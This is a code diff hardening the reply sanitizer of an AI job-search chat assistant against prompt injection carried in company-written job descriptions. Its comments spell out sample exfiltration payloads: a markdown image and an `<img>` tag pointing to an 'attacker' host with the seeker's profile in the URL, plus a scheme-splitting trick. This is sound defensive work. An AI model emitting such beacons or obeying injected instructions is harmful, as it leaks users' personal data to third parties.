@@ -461,22 +461,49 @@ CHAT_MODEL_TIMEOUT_SECONDS = 60
 # services — so cap the output explicitly.
 CHAT_MAX_OUTPUT_TOKENS = 1024
 
-# Markdown images/links, raw HTML tags, and bare/protocol-relative URLs are
-# stripped from the reply. A job description is company-authored text that
-# reaches the model, so it can ask the assistant to emit
-# ![](https://attacker/?d=<the seeker's profile>) or an equivalent raw
-# <img src="//attacker/..."> / entity-encoded variant; a client rendering
-# that markdown or HTML would beacon the seeker's data to the post's author.
-# The system prompt also forbids it — this is the enforcement.
-_HTML_TAG_RE = re.compile(r'</?[a-zA-Z][a-zA-Z0-9]*(?:\s[^<>]*)?/?>')
+# Markdown images/links, request-capable raw HTML tags, and bare/www/
+# protocol-relative URLs are stripped from the reply. A job description is
+# company-authored text that reaches the model, so it can ask the assistant
+# to emit ![](https://attacker/?d=<the seeker's profile>) or an equivalent
+# raw <img src="//attacker/..."> / entity-encoded / www.-prefixed variant; a
+# client rendering that markdown or HTML would beacon the seeker's data to
+# the post's author. The system prompt also forbids it — this is the
+# enforcement.
+#
+# _HTML_TAG_RE is a NAME ALLOWLIST, not "any tag": stripping every `<word>`
+# corrupts ordinary text that merely looks tag-shaped — `if a<b and b>c`,
+# `List<int>`, a reply that discusses `<div>`/`<span>` — none of which can
+# fetch anything. Only tags that can initiate a request or execute code are
+# stripped; matching is by exact name (IGNORECASE) so "b" never matches the
+# "base" alternative, etc.
+_DANGEROUS_TAG_NAMES = (
+    'img', 'script', 'iframe', 'object', 'embed', 'source', 'video', 'audio',
+    'link', 'a', 'form', 'input', 'svg', 'style', 'base', 'meta', 'track',
+    'picture',
+)
+_HTML_TAG_RE = re.compile(
+    r'</?(?:' + '|'.join(_DANGEROUS_TAG_NAMES) + r')(?:\s[^<>]*)?/?>',
+    re.IGNORECASE)
 _MD_IMAGE_RE = re.compile(r'!\[[^\]]*\]\([^)]*\)')
 _MD_LINK_RE = re.compile(r'\[([^\]]*)\]\([^)]*\)')
-_BARE_URL_RE = re.compile(r'\b(?:https?|ftp|data)://\S+', re.IGNORECASE)
+# ANY scheme, not an enumerated list: `ws://`, `file://`, `blah://` are just
+# as capable of surfacing as a clickable/fetchable URI in a rendering client
+# as `https://` is. Run AFTER _HTML_TAG_RE so a scheme assembled by tag
+# removal (`ws:<script>//host</script>` -> `ws://host`) cannot survive.
+_BARE_URL_RE = re.compile(r'\b[a-zA-Z][a-zA-Z0-9+.-]*://\S+')
+# GitHub-flavoured markdown (and most chat renderers) autolink a bare
+# `www.host.tld` even with no scheme and no leading slashes at all.
+_WWW_URL_RE = re.compile(r'\bwww\.[\w-]+(?:\.[\w-]+)+(?:[/?#]\S*)?',
+                         re.IGNORECASE)
 # Scheme-relative (`//host/...`): browsers resolve these against the current
 # page scheme, so they fire a cross-origin request exactly like a full URL.
-# The negative lookbehind skips the "//" that is already part of a
-# scheme://... match — those are removed by _BARE_URL_RE first.
-_PROTOCOL_RELATIVE_URL_RE = re.compile(r'(?<!:)//[^\s)\]>"\']+')
+# Requires a DOT-BEARING host after the "//" before deleting anything, so
+# ordinary prose ("2024//2025", "and//or", "/usr//local/bin",
+# "example.com//page" — none has a dot immediately after "//") survives.
+# No restriction on what precedes the "//": that is what lets this also
+# catch the tail of an assembled-but-broken scheme URL, e.g. "ws:<b>//host"
+# where <b> is not in the tag allowlist and so is never removed.
+_PROTOCOL_RELATIVE_URL_RE = re.compile(r'//[\w-]+(?:\.[\w-]+)+(?:[/?#]\S*)?')
 # Collapses runs of spaces/tabs, but only mid-line: the lookbehind requires a
 # non-whitespace character immediately before the run, so leading indentation
 # on a line (fenced code, nested markdown lists) is never touched.
@@ -492,17 +519,21 @@ def _sanitize_reply(text):
 
     Order matters: entities are decoded first so a scheme cannot be smuggled
     past the URL matchers by encoding a character (e.g. `https&#58;//host`
-    decodes to `https://host` before any matcher runs). Raw HTML tags are
-    then stripped as whole units — `<img src="...">` or `<a href="...">text
-    </a>` — so a URL hidden in an attribute never leaks even though `text`
-    survives. The markdown and bare/protocol-relative URL matchers then
-    handle whatever is left in plain markdown or prose form.
+    decodes to `https://host` before any matcher runs). Dangerous raw HTML
+    tags are then stripped as whole units — `<img src="...">` or
+    `<a href="...">text</a>` — so a URL hidden in an attribute never leaks
+    even though `text` survives, and so a scheme split across a stripped tag
+    (`ws:<script>//host</script>`) is fully assembled BEFORE the URL
+    matchers run, rather than surviving as an unrecognisable fragment. The
+    markdown, scheme, www, and protocol-relative URL matchers then handle
+    whatever is left in plain markdown or prose form.
     """
     text = html.unescape(text)
     text = _HTML_TAG_RE.sub('', text)
     text = _MD_IMAGE_RE.sub('', text)
     text = _MD_LINK_RE.sub(r'\1', text)
     text = _BARE_URL_RE.sub('', text)
+    text = _WWW_URL_RE.sub('', text)
     text = _PROTOCOL_RELATIVE_URL_RE.sub('', text)
     return _MULTI_SPACE_RE.sub(' ', text).strip()
 
@@ -656,12 +687,14 @@ def send_chat_message(user, *, message, conversation_id=None, model=None,
         try:
             _record_turn_usage(user, model, _stored_messages(checkpointer, config), started)
         except Exception:  # pragma: no cover - bookkeeping must not mask the original error
-            logger.warning('ai chat: failed to record usage for a failed turn '
-                           'conversation=%s', conversation.id)
+            # .exception(), not .warning(): a real DB outage here needs a
+            # traceback to diagnose, not just a bare message.
+            logger.exception('ai chat: failed to record usage for a failed turn '
+                             'conversation=%s', conversation.id)
         try:
             _rollback_new_conversation(conversation, checkpointer, created_now)
         except Exception:  # pragma: no cover - bookkeeping must not mask the original error
-            logger.warning('ai chat: rollback failed conversation=%s', conversation.id)
+            logger.exception('ai chat: rollback failed conversation=%s', conversation.id)
         if isinstance(exc, ModelCallLimitExceededError):
             # thread_limit is cumulative and checkpointed: hitting it means the
             # thread can never answer again, which is a different fact about
